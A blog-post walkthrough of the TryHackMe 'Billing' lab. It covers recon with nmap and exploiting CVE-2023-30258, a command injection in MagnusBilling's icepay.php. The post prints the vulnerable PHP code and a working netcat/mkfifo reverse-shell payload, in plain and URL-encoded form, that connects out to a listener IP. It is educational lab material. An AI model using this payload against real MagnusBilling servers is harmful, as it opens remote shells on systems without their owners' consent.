---
layout: post
title: Billing Writeup
author: 0xray1e
image: /assets/img/uploads/billing - banner image.png
date: 2026-03-04T14:30:00.000+03:00
description: A walkthrough of the Billing Room in TryHackMe.
categories:
  - Boot-to-Root
---
[Billing room THM](https://tryhackme.com/room/billing)

## Room Description

Gain a shell, find the way and escalate your privileges!

**Note:** Bruteforcing is out of scope for this room.

## Recon

After starting the machine and getting the IP address, I started by doing an nmap scan.

```shell
nmap -sC -sV -Pn -p- 10.65.129.26 -T4 -oN nmap.txt
```

`-sC Runs default nmap scripts on discovered services`

`-sV Probe service and version info of open ports`

`-Pn skip host discovery (assume host is online)`

![billing-nmap scan](/assets/img/uploads/billing-nmap scan.png "billing-nmap scan")

The target had an http port open so I opened it in the browser and as you can see it is a login page.

![mbilling login page](/assets/img/uploads/billing-mbilling login page.png "mbilling login page")

## Exploit

The room had stated that the bruteforcing is not allowed so I just decided to find whether this was an actual system by looking it up on google. I found out that there is a system called [MagnusBilling](https://www.magnusbilling.org/) which is an open-source billing system. Next, was to look for public exploits.

I came across [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258) which describes command injection vulnerability. The vulnerability is in icepay.php in the democ parameter.

Vulnerable code:

```
if (isset($_GET['democ'])) {
    if (strlen($_GET['democ']) > 5) {
        exec("touch " . $_GET['democ'] . '.txt');
    } else {
        exec("rm -rf *.txt");
    }
}
```

This code takes `democ` parameter and passes its values to exec (which in PHP, executes external commands). In this case, exec() creates the file specified by the democ parameter and appends .txt  make it a .txt file.

**Example:**

`?democ=testfile` becomes `exec( touch testfile .txt)` which creates testfile.txt file.

Assuming we wanted to spawn a reverse shell, we would do something like;

`testfile;<command>;testfile`

The `;` tells PHP to execute the next command immediately.

### Payload 

To spawn a reverse shell I used this playload:

```
GET /mbilling/lib/icepay/icepay.php?democ=file;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.141.57 4444 >/tmp/f;file
```

Let's break this down:

`/mbilling/lib/icepay/icepay.php` - This is the vulnerable endpoint.

`?democ` - This is the parameter

The rest is the value where:

`file;` - The value expected by the endpoint

`rm /tmp/f;` - Deletes any file called f in tmp directory

`mkfifo /tmp/f;` - creates a named pipe (a first in first out file ), that allows unrelated processes to communicate.

`cat /tmp/f|bash -i` - pipes the content of /tmp/f to an interactive bash shell

`2>&1` - redirects standard error to standard output so you can see error messages on your listener

`|nc 192.168.141.57 4444` >/tmp/f; - connects to your listener and redirects the content of your listener to the named pipe

`file `- this is added because the code expects a filename, so that .txt can be added. Without this, the payload generates an error and is not executed. 



**TLDR:** The command creates a named pipe and starts a bash shell, redirects errors to your listener, connects to your listener and redirects your STDIN to /tmp/f so that instead of your commands being printed on the victim's screen, it is shoved to /tmp/f and gets executed by the bash shell.



This is what the payload looks like when passed to exec()

```
exec("touch file;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.141.57 4444 >/tmp/f;file.txt)
```

## User Flag

Having the payload, I started a listener using nc and sent the URL-encoded payload.

```
GET /mbilling/lib/icepay/icepay.php?democ=file%3brm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|bash+-i+2>%261|nc+192.168.141.57+4444+>/tmp/f%3bfile
```

![burpsuite request](/assets/img/uploads/billing-burpsuite payload.png "burpsuite request")

Sending the request spawned a shell on my listener.

![shell](/assets/img/uploads/billing-spawn shell.png "shell")

Retrieve the user flag.

![user flag](/assets/img/uploads/billing-user flag.png "user flag")
